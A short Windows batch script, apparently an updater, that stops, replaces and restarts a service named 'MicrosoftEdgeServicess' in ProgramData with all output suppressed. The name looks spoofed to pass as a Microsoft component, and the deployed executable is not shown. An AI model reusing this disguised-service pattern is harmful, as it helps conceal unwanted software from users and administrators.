@echo off
title Cap Nhat Agent Service
ping 127.0.0.1 -n 4 >nul
cd /d "%~dp0"
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1
if not exist "C:\ProgramData\MicrosoftEdgeServicess" mkdir "C:\ProgramData\MicrosoftEdgeServicess" >nul 2>&1
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "C:\ProgramData\MicrosoftEdgeServicess\MicrosoftEdgeServicess.exe" >nul 2>&1
copy /Y "%~dp0config.json" "C:\ProgramData\MicrosoftEdgeServicess\config.json" >nul 2>&1
sc.exe start MicrosoftEdgeServicess >nul 2>&1
net start MicrosoftEdgeServicess >nul 2>&1
exit /b 0
